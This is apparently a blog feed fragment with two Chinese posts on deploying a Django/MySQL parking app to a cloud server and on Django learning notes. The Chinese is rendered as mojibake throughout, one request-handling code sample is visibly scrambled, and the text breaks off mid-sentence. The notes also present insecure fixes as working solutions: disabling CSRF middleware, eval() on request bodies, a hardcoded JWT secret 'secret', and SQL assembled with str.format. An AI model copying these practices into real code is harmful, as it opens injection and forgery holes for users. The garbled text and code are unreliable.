    <title>è®°ä¸€æ¬¡è½¬ç§»ç¯å¢ƒä¸ŠæœåŠ¡å™¨</title>
    <link href="/2020/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BD%AC%E7%A7%BB%E7%8E%AF%E5%A2%83%E4%B8%8A%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <url>/2020/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BD%AC%E7%A7%BB%E7%8E%AF%E5%A2%83%E4%B8%8A%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>æœ¬æƒ³ç€æœ¬åœ°dockerè°ƒå¥½ç›´æ¥ä¼ ä¸Šå»çš„ï¼Œç„¶é¹…ä¸€å¼€vscode remoteå°±å´©</p><p>å¹¶ä¸”ï¼Œvscode remoteä¹Ÿä»…æŒ‡æœ¬åœ°çš„dockeré‡Œï¼Œä¸æ˜¯äº‘æœåŠ¡å™¨çš„ç¯å¢ƒï¼ŒQAQ</p><h2 id="ä¸Šä¼ "><a href="#ä¸Šä¼ " class="headerlink" title="ä¸Šä¼ "></a>ä¸Šä¼ </h2><p>xftp å­¦ç”Ÿå…è´¹ç‰ˆï¼Œå¯äº†</p><p>å®‰è£…å¥½æ•°æ®åº“åï¼Œè®°å¾—è®¾ç½®å¯†ç ï¼Œ<a href="https://www.mysqlzh.com/doc/19/63.html">å‚è€ƒ</a></p><p>ä¿®æ”¹utf8ä¸ºutf8mb4</p><p><code>vim /etc/mysql/my.cnf</code></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[mysqld]</span><br><span class="hljs-attr">character-set-server</span>=utf8mb4<br><br><span class="hljs-section">[mysql]</span><br><span class="hljs-attr">default-character-set</span>=utf8mb4<br><br><span class="hljs-section">[client]</span><br><span class="hljs-attr">default-character-set</span>=utf8mb4                  <br></code></pre></td></tr></table></figure><p>æ•°æ®å¯¼å‡ºï¼Œmysql åœ¨powershell ä½¿ç”¨mysqldumpï¼Œä½¿ç”¨çš„æ˜¯utb-16ç¼–ç ï¼Œcmdé‡Œå¯¼å‡ºçš„å°±æ˜¯utf8</p><blockquote><p>ERROR 1273 (HY000) at line 22: Unknown collation: â€˜utf8mb4_0900_ai_ciâ€™</p><p>æ–‡ä»¶ä¸­çš„æ‰€æœ‰çš„<code>utf8mb4_0900_ai_ci</code>æ›¿æ¢ä¸º<code>utf8_general_ci</code></p><p>å› ä¸ºæˆ‘è¿™é‡Œéƒ½æ˜¯ä½¿ç”¨utf8mb4çš„ï¼Œå¦‚æœæ˜¯ä½¿ç”¨utf8çš„ï¼ŒæŠŠ<code>utf8mb4</code>æ›¿æ¢ä¸º<code>utf8</code></p></blockquote><p>ç„¶å<code>mysql -u root -p parking &lt; parking.sql</code></p><p>è¡¨å†™å…¥æ•°æ®åº“ä¸­ã€‚</p><blockquote><p>æ­¤å¤„å‡ºç°äº†å†™å…¥è¡¨åï¼Œé€€å‡ºå†è¿›å…¥æ— è®°å½•çš„æƒ…å†µï¼ŒåŸå› ä¸æ˜ã€‚ä½†æ˜¯åœ¨æˆ‘æŠŠmysql5.7æ›´æ¢åˆ°è·Ÿå¼€å‘ç¯å¢ƒç›¸åŒçš„mysql8.0åï¼ˆä¹‹å‰ä»¥ä¸ºæ˜¯8.0QAQï¼‰å†æ¬¡å†™å…¥å°±å¯ä»¥äº†</p></blockquote><h2 id="é…ç½®ä¸éƒ¨ç½²"><a href="#é…ç½®ä¸éƒ¨ç½²" class="headerlink" title="é…ç½®ä¸éƒ¨ç½²"></a>é…ç½®ä¸éƒ¨ç½²</h2><p>ç”±äºè¿˜æ²¡æœ‰æ‘¸é€nginxå’Œuwgsiï¼Œæ•…å…ˆç”¨äº†runserverçš„ç®€é™‹ï¼ˆèœï¼‰å½¢å¼æµ‹è¯•äº†å…ˆï¼Œé˜¿é‡Œäº‘æ‰“å¼€ç«¯å£ã€‚==ä¸­é—´æ— æ•°æ¬¡ä¸´æ—¶debugï¼Œè®©æˆ‘æ„Ÿè§‰åˆ°å¦‚æœæ˜¯æœ¬åœ°æ”¹å®Œè¿œç¨‹ç›´æ¥åŒæ­¥ä¼šæœ‰å¤šä¹ˆçš„ä¾¿åˆ©==</p><p>å¾…è¡¥ï¼Œnginxå’Œuwgsi</p><h2 id="æ„Ÿæ…¨"><a href="#æ„Ÿæ…¨" class="headerlink" title="æ„Ÿæ…¨"></a>æ„Ÿæ…¨</h2><p>å½“ç„¶ï¼Œä»¥ä¸Šå¹¶ä¸æ˜¯çœŸæ­£éƒ¨ç½²ä¸€ä¸ªé¡¹ç›®è¿è¡Œ</p><p>å¯èƒ½åœ¨dockerä¸­å¼€å‘æµ‹è¯•å¥½ç›´æ¥ä¸¢æœåŠ¡å™¨ä¸Šæ˜¯æœ€ä½³é€‰æ‹©ï¼ˆå½“ç„¶è·Ÿæˆ‘æœ¬åœ°æ²¡æµ‹è¯•é€šå…¨éƒ¨ä¹Ÿæœ‰å¾ˆå¤§å…³ç³»ï¼Œä¸»è¦è¿˜æ˜¯æµ‹è¯•ä¸å¤Ÿï¼‰</p><p>ç„¶ååœ¨æœåŠ¡å™¨å‡çº§ç¯å¢ƒçš„è¿‡ç¨‹ä¸­ï¼Œä¹Ÿä¸€åº¦åªèƒ½å¹²å·´å·´ç­‰ç€ï¼Œå¥½åœ¨é˜¿é‡Œäº‘çš„ä¸‹è½½é€Ÿåº¦è¿˜æ˜¯å¾ˆå¿«çš„ã€‚</p><p>ç»“æŸä¹‹åï¼Œå°è¯•äº†tmuxï¼Œé»˜è®¤æ—¶å€™ä¸èƒ½é¼ æ ‡åˆ‡æ¢åˆ‡åˆ†å‡ºæ¥çš„çª—å£0.0ï¼ˆå¯èƒ½ä¸»è¦å› ä¸ºæ²¡è®¾ç½®å¥½ï¼‰</p><p>éšåå‘ç°terminusè‡ªå¸¦äº†åˆ‡åˆ†å±å¹•ï¼ˆå“ï¼Œæš´æ®„å¤©ç‰©ï¼‰</p><img src="/2020/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BD%AC%E7%A7%BB%E7%8E%AF%E5%A2%83%E4%B8%8A%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20200407022222234.png" class="" title="image-20200407022222234"><p><strong>å†æ¬¡è¯´æ˜ï¼Œé¡¹ç›®ä¸æ˜¯çœŸæ­£éƒ¨ç½²äº†çš„QAQï¼Œä»…ä¸€ç‚¹è®°å½•</strong></p><p>å¯å‚è€ƒçš„linkï¼š</p><p><a href="https://blog.csdn.net/qq_41448891/article/details/90696004">https://blog.csdn.net/qq_41448891/article/details/90696004</a></p><p><a href="https://www.cnblogs.com/chenice/p/6921727.html">https://www.cnblogs.com/chenice/p/6921727.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>djangoå­¦ä¹ è®°å½•</title>
    <link href="/2020/04/03/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/04/03/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p><code>python manage.py runserver 127.0.0.1:28000</code></p><h2 id="å°†ç°æœ‰æ•°æ®åº“å¯¼å…¥åˆ°models-pyä¸­"><a href="#å°†ç°æœ‰æ•°æ®åº“å¯¼å…¥åˆ°models-pyä¸­" class="headerlink" title="å°†ç°æœ‰æ•°æ®åº“å¯¼å…¥åˆ°models.pyä¸­"></a>å°†ç°æœ‰æ•°æ®åº“å¯¼å…¥åˆ°models.pyä¸­</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python manage.py inspectdb &gt; app/models.py<br></code></pre></td></tr></table></figure><h2 id="jså®ç°å®šæ—¶åˆ·æ–°é¡µé¢"><a href="#jså®ç°å®šæ—¶åˆ·æ–°é¡µé¢" class="headerlink" title="jså®ç°å®šæ—¶åˆ·æ–°é¡µé¢"></a>jså®ç°å®šæ—¶åˆ·æ–°é¡µé¢</h2><p><a href="https://blog.csdn.net/baidu_38990811/article/details/79172163">Ajaxè½®è¯¢,Ajaxé•¿è½®è¯¢å’Œwebsocket(è¯¦ç»†ä½¿ç”¨)</a></p><h2 id="django-shell-è°ƒè¯•"><a href="#django-shell-è°ƒè¯•" class="headerlink" title="django shell è°ƒè¯•"></a>django shell è°ƒè¯•</h2><p><code>python manage.py shell</code></p><h3 id="pythonå°é—®é¢˜"><a href="#pythonå°é—®é¢˜" class="headerlink" title="pythonå°é—®é¢˜"></a>pythonå°é—®é¢˜</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">orders_num = ordersdate = orders_car_size = orders_price = []<br></code></pre></td></tr></table></figure><img src="/2020/04/03/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200322135749091.png" class="" title="image-20200322135749091"><p>ä¼šæŒ‡å‘åŒä¸€ä¸ªå†…å­˜åœ°å€QAQ</p><p>å«å¼•ç”¨èµ‹å€¼</p><h2 id="é—®é¢˜è§£å†³"><a href="#é—®é¢˜è§£å†³" class="headerlink" title="é—®é¢˜è§£å†³"></a>é—®é¢˜è§£å†³</h2><h3 id="è®¿é—®ä¸åˆ°å†™å¥½çš„path"><a href="#è®¿é—®ä¸åˆ°å†™å¥½çš„path" class="headerlink" title="è®¿é—®ä¸åˆ°å†™å¥½çš„path"></a>è®¿é—®ä¸åˆ°å†™å¥½çš„path</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">urlpatterns = [   path(<span class="hljs-string">&#x27;addUsers/&#x27;</span>,views.add_users,name=<span class="hljs-string">&#x27;add_users&#x27;</span>)<span class="hljs-comment">#api/addUsers</span><br>]<br></code></pre></td></tr></table></figure><p>æ£€æŸ¥path(â€˜path/â€˜)çš„æ–œæ </p><h3 id="Django-ç”¨postmanè¿›è¡Œpostè¯·æ±‚æ—¶ï¼šForbidden-CSRF-cookie-not-set-403"><a href="#Django-ç”¨postmanè¿›è¡Œpostè¯·æ±‚æ—¶ï¼šForbidden-CSRF-cookie-not-set-403" class="headerlink" title="Django ç”¨postmanè¿›è¡Œpostè¯·æ±‚æ—¶ï¼šForbidden (CSRF cookie not set.) 403"></a>Django ç”¨postmanè¿›è¡Œpostè¯·æ±‚æ—¶ï¼šForbidden (CSRF cookie not set.) 403</h3><p>æ³¨é‡Šæ‰settings.pyä¸­çš„<br>MIDDLEWARE çš„ â€˜django.middleware.csrf.CsrfViewMiddlewareâ€™ </p><p><strong>è¿æ¥mysqlå‡ºé”™</strong></p><p>django.db.utils.OperationalError: (2059) <a href="https://www.jianshu.com/p/e6e6293af2dc">è§£å†³åŠæ³•</a></p><p><strong>ormæŸ¥è¯¢</strong></p><p><a href="https://www.cnblogs.com/chenxinming-top/p/9506857.html">https://www.cnblogs.com/chenxinming-top/p/9506857.html</a></p><p><strong>å¼•å…¥bootstrapç½‘ç«™é”™ä½</strong></p><p>å¯èƒ½åŸæœ¬å°±å¼•å…¥äº†ï¼ˆXD</p><p><strong>å¼‚æ­¥åŠ è½½æ•°æ®</strong></p><p>ä»mysqlè¯»å–æ•°æ®ï¼Œç„¶åæ”¾ç½®åˆ°echartsä¸­ï¼Œæ•ˆæœå¦‚å›¾</p><img src="/2020/04/03/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200222230043961.png" class="" title="image-20200222230043961"><p>echarts js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;div id=<span class="hljs-string">&quot;main&quot;</span> style=<span class="hljs-string">&quot;width: 790px;height:600px;&quot;</span>&gt;&lt;/div&gt;<br>    &lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>      <span class="hljs-keyword">var</span> develop_name_list = &#123;&#123; develop_name_list|safe &#125;&#125;;<br>      <span class="hljs-keyword">var</span> develop_num_list = &#123;&#123; develop_num_list|safe &#125;&#125;;<br>      <span class="hljs-keyword">var</span> myChart = echarts.init(<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;main&#x27;</span>));<br>      <span class="hljs-keyword">var</span> option = &#123;<br>          grid: &#123;<span class="hljs-attr">containLabel</span>: <span class="hljs-literal">true</span>&#125;,<br>          xAxis: &#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;æ•°é‡&#x27;</span>&#125;,<br>          yAxis: &#123;<br>            type: <span class="hljs-string">&#x27;category&#x27;</span>,<br>            data: develop_name_list<br>            &#125;,<br>          series: [<br>              &#123;<br>                  type: <span class="hljs-string">&#x27;bar&#x27;</span>,<br>                  encode: &#123;<span class="hljs-attr">x</span>: <span class="hljs-string">&#x27;amount&#x27;</span>,<span class="hljs-attr">y</span>: <span class="hljs-string">&#x27;product&#x27;</span>&#125;,<br>                  data: develop_num_list<br>              &#125;<br>          ]<br>      &#125;;<br>      myChart.setOption(option);<br>    &lt;/script&gt;<br></code></pre></td></tr></table></figure><p><code>&#123;&#123; develop_name_list|safe &#125;&#125;</code> çš„<code>|safe</code>æ˜¯å¿…é¡»çš„ï¼Œ<code>myChart.setOption(option);</code>ä¹Ÿæ˜¯å¿…é¡»çš„ï¼Œå¹¶ä¸”</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">yAxis: &#123;<br>            type: <span class="hljs-string">&#x27;category&#x27;</span>,<br>            data: develop_name_list<br>            &#125;,<br></code></pre></td></tr></table></figure><p>çš„type:ä¹Ÿä¸€å®šæ—¶category==ç›®å‰ä»…çŸ¥é“é’ˆå¯¹è¿™ä¸ªå›¾å¯è¡Œ==</p><h3 id="ä½¿ç”¨bootstrapæŠ˜å é¢æ¿ä¹‹ååœ¨é‡Œé¢æ”¾ç½®jsä¸æ¸²æŸ“"><a href="#ä½¿ç”¨bootstrapæŠ˜å é¢æ¿ä¹‹ååœ¨é‡Œé¢æ”¾ç½®jsä¸æ¸²æŸ“" class="headerlink" title="ä½¿ç”¨bootstrapæŠ˜å é¢æ¿ä¹‹ååœ¨é‡Œé¢æ”¾ç½®jsä¸æ¸²æŸ“"></a>ä½¿ç”¨bootstrapæŠ˜å é¢æ¿ä¹‹ååœ¨é‡Œé¢æ”¾ç½®jsä¸æ¸²æŸ“</h3><p>è¿˜æ²¡ä¼šï¼Œæ— è§£qaq</p><h3 id="pythonæ¨¡ç³ŠæŸ¥è¯¢-é—®é¢˜"><a href="#pythonæ¨¡ç³ŠæŸ¥è¯¢-é—®é¢˜" class="headerlink" title="pythonæ¨¡ç³ŠæŸ¥è¯¢%é—®é¢˜"></a>pythonæ¨¡ç³ŠæŸ¥è¯¢%é—®é¢˜</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">sql = <span class="hljs-string">&#x27;&#x27;&#x27; SELECT job_Name,description FROM history</span><br><span class="hljs-string">                WHERE job_Name like &quot;%%&#123;&#125;%%&quot; and job_Name like &quot;%%&#123;&#125;%%&quot;&#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;java&#x27;</span>,<span class="hljs-string">&#x27;åç«¯&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="Getæ–¹æ³•"><a href="#Getæ–¹æ³•" class="headerlink" title="Getæ–¹æ³•"></a>Getæ–¹æ³•</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Scan_Detail</span>(<span class="hljs-title">TemplateView</span>):</span><br>    template_name = <span class="hljs-string">&#x27;scandetails.html&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, request, *args, **kwargs)</span></span><span class="hljs-symbol">:</span><br>        <span class="hljs-keyword">self</span>.target = request.GET.get(<span class="hljs-string">&#x27;target&#x27;</span>)<br>        <span class="hljs-keyword">self</span>.timestamp = request.GET.get(<span class="hljs-string">&#x27;timestamp&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>().get(request, *args, **kwargs)<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_context_data</span><span class="hljs-params">(<span class="hljs-keyword">self</span> , **kwargs)</span></span><span class="hljs-symbol">:</span><br>        context = <span class="hljs-keyword">super</span>().get_context_data(**kwargs)<br>        data_list = NetworkSegmentVuln_sql(<span class="hljs-keyword">self</span>.target,<span class="hljs-keyword">self</span>.timestamp)<br>        <span class="hljs-keyword">return</span> context<br></code></pre></td></tr></table></figure><img src="/2020/04/03/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200315130344606.png" class="" title="image-20200315130344606"><h2 id="æ¥æ”¶headeræˆ–body"><a href="#æ¥æ”¶headeræˆ–body" class="headerlink" title="æ¥æ”¶headeræˆ–body"></a>æ¥æ”¶headeræˆ–body</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"> è·å–æ­£åˆ™åŒ¹é…åˆ°çš„æ•°æ®,num1æœªä½ç½®å‚æ•°,num2ä¸ºå‘½åå‚æ•°,<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>(<span class="hljs-params">request,num2=<span class="hljs-literal">None</span>, num1=<span class="hljs-literal">None</span></span>):</span><br> <span class="hljs-built_in">print</span>(num2)<br> <span class="hljs-comment"># æ„é€ å“åº”æ•°æ®</span><br> reNT<span class="hljs-string">&#x27;)</span><br><span class="hljs-string"> sp = HttpResponse(&#x27;</span>hello world<span class="hljs-string">&#x27;)</span><br><span class="hljs-string"> # è·å–è¯·æ±‚å¤´</span><br><span class="hljs-string"> header = request.META.get(&#x27;</span>HTTP_USER_AGE)<br> <span class="hljs-comment"># è·å–åœ°å€</span><br> path = request.path<br> <span class="hljs-comment"># è·å–GETåé¢çš„æ•°æ®(è·å–æŸ¥è¯¢å­—ç¬¦ä¸²æ•°æ®)</span><br> para = request.GET()<br> <span class="hljs-comment"># è·å–jsonæ•°æ®</span><br> json_data = request.body<br> data = <span class="hljs-built_in">eval</span>(request.body.decode()).get(<span class="hljs-string">&#x27;asd&#x27;</span>)<br> data1 = json.loads(request.body).get(<span class="hljs-string">&#x27;asd&#x27;</span>)<br> <span class="hljs-comment"># è·å–è¡¨å•æ•°æ®</span><br> form_data = request.POST<br> <span class="hljs-comment"># è·å–è¯·æ±‚æ–¹æ³•</span><br> method = request.method<br> <span class="hljs-comment"># è·å–æ–‡ä»¶</span><br> file_obj = request.FILES.get(<span class="hljs-string">&#x27;image&#x27;</span>)<br> <span class="hljs-keyword">return</span> resp<br></code></pre></td></tr></table></figure><h2 id="tokenå’Œcookie"><a href="#tokenå’Œcookie" class="headerlink" title="tokenå’Œcookie"></a>tokenå’Œcookie</h2><p><a href="https://www.cnblogs.com/moyand/p/9047978.html">å‚è€ƒèµ„æ–™</a></p><p>å¤§éƒ¨åˆ†apiå’Œwebåº”ç”¨éƒ½ç”¨tokensï¼Œä¾‹å¦‚fbï¼Œgoogleï¼Œæ¨ç‰¹ï¼Œgihub</p><p>å®ç°æ–¹æ³•æ˜¯JSON Web Tokens</p><p><a href="https://www.v2ex.com/t/530103">è¯¦ç»†-æœ‰æ¡ˆä¾‹-Django+JWT å®ç° Token è®¤è¯</a></p><p><a href="https://juejin.im/post/59749e3751882559274bc80d#heading-11?tdsourcetag=s_pctim_aiomsg">ç†è§£JWTï¼ˆJSON Web Tokenï¼‰è®¤è¯åŠpythonå®è·µ</a></p><p><a href="https://juejin.im/post/5df04203e51d45581269a146?tdsourcetag=s_pctim_aiomsg">pythonæ¥å£è‡ªåŠ¨åŒ–ï¼ˆäºŒåï¼‰â€“tokenç™»å½•ï¼ˆè¯¦è§£ï¼‰</a></p><p>å¯ç”¨åº“ï¼š<a href="https://github.com/jpadilla/pyjwt/">pyjwt</a></p><h2 id="å“åº”"><a href="#å“åº”" class="headerlink" title="å“åº”"></a>å“åº”</h2><p>æ‰€æœ‰å“åº”åŒ…å«ä¸‰éƒ¨åˆ†ï¼ŒçŠ¶æ€ç  codeã€æ•°æ® dataã€æ¶ˆæ¯ msg<br>æ‰€æœ‰å†…å®¹éƒ½åœ¨ data é‡Œï¼Œmsg æ˜¯é™„åŠ çš„çŠ¶æ€æ¶ˆæ¯</p><p>æœ€åç”¨äº†ç®€å•æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#åç«¯</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_token</span>(<span class="hljs-params">users_id,users_name</span>):</span><br>    payload = &#123;<br>        <span class="hljs-string">&quot;iss&quot;</span>: <span class="hljs-string">&quot;parkingapp.com&quot;</span>,<br>         <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-built_in">int</span>(time.time()),<br>         <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-built_in">int</span>(time.time()) + <span class="hljs-number">86400</span> * <span class="hljs-number">7</span>,<br>         <span class="hljs-string">&quot;users_id&quot;</span>: users_id,<br>         <span class="hljs-string">&quot;user_name&quot;</span>: users_name,<br>    &#125;<br>    token = jwt.encode(payload, <span class="hljs-string">&#x27;secret&#x27;</span>, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    json_dict_success = &#123;<span class="hljs-string">&#x27;code&#x27;</span>: Httpcode.success,<span class="hljs-string">&#x27;token&#x27;</span>: <span class="hljs-built_in">str</span>(token)&#125;<br>    <span class="hljs-keyword">return</span> JsonResponse(json_dict_success, json_dumps_params=&#123;<span class="hljs-string">&#x27;ensure_ascii&#x27;</span>: <span class="hljs-literal">False</span>&#125;)<br><br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;!-- js --&gt;<br>$.ajax(&#123;<br>type: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>url: <span class="hljs-string">&#x27;http://localhost:8000&#x27;</span>+ add_users_api,<br>data: &#123;<span class="hljs-attr">users_name</span>: name,<br>        users_email: email,<br>        users_phone: phone&#125;,<br>success: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-number">201</span> === data.code)&#123;<br>alert(<span class="hljs-string">&quot;æ³¨å†ŒæˆåŠŸï¼&quot;</span>);<br><span class="hljs-built_in">localStorage</span>.setItem(<span class="hljs-string">&quot;token&quot;</span>, data.token);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>alert(<span class="hljs-string">&quot;æ³¨å†Œå¤±è´¥ï¼Œè¯·åœ¨æ£€æŸ¥ç½‘ç»œåé‡è¯•ï¼&quot;</span>);<br>&#125;<br> &#125;,<br>error: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;<br>alert(<span class="hljs-string">&quot;æ³¨å†Œå¤±è´¥ï¼Œè¯·åœ¨æ£€æŸ¥ç½‘ç»œåé‡è¯•ï¼&quot;</span>)<br> &#125;,<br>&#125;);<br><br></code></pre></td></tr></table></figure><h3 id="è¯†åˆ«token"><a href="#è¯†åˆ«token" class="headerlink" title="è¯†åˆ«token"></a>è¯†åˆ«token</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> token = <span class="hljs-built_in">localStorage</span>.getItem(<span class="hljs-string">&#x27;token&#x27;</span>);<br><span class="hljs-built_in">console</span>.log(token);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> === token)&#123;<br>alert(<span class="hljs-string">&quot;è¯·å…ˆç™»å½•æˆ–æ³¨å†Œè´¦æˆ·&quot;</span>);<br>&#125;<br>$.ajax(&#123;<br>type: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>url: <span class="hljs-string">&#x27;http://localhost:8000&#x27;</span>+ verify_token,<br>data: &#123;<span class="hljs-attr">token</span>: token&#125;,<br>success: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)</span>&#123;<br>alert(<span class="hljs-string">&#x27;éªŒè¯æˆåŠŸ&#x27;</span>);<br>&#125;,<br>error: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)</span>&#123;<br>alert(data)<br>&#125;,<br>&#125;);<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">verify_token</span>(<span class="hljs-params">request</span>):</span><br>    token = request.POST.get(<span class="hljs-string">&#x27;token&#x27;</span>,<span class="hljs-number">0</span>)<br>    result = jwt.decode(token, <span class="hljs-string">&#x27;secret&#x27;</span>, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="å›ä¼ æ•°æ®"><a href="#å›ä¼ æ•°æ®" class="headerlink" title="å›ä¼ æ•°æ®"></a>å›ä¼ æ•°æ®</h3><p>ä¸€å¼€å§‹æ˜¯</p><img src="/2020/04/03/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200322164623665.png" class="" title="image-20200322164623665"><p>å¤§ä½¬æ¨èæ”¹æˆå¦‚ä¸‹å›¾ï¼Œé¢å‘å¯¹è±¡</p><img src="/2020/04/03/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%7B603E00A4-D802-FAFC-F8C6-D56187F2F88A%7D.jpg" class="" title="img"><h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><h3 id="å‰ç«¯postæ•°æ®åˆ°åç«¯ï¼Œåç«¯æ¥æ”¶åˆ°è¯·æ±‚ä½†æ— æ•°æ®ä¼ é€’"><a href="#å‰ç«¯postæ•°æ®åˆ°åç«¯ï¼Œåç«¯æ¥æ”¶åˆ°è¯·æ±‚ä½†æ— æ•°æ®ä¼ é€’" class="headerlink" title="å‰ç«¯postæ•°æ®åˆ°åç«¯ï¼Œåç«¯æ¥æ”¶åˆ°è¯·æ±‚ä½†æ— æ•°æ®ä¼ é€’"></a>å‰ç«¯postæ•°æ®åˆ°åç«¯ï¼Œåç«¯æ¥æ”¶åˆ°è¯·æ±‚ä½†æ— æ•°æ®ä¼ é€’</h3><p>å¯èƒ½å› 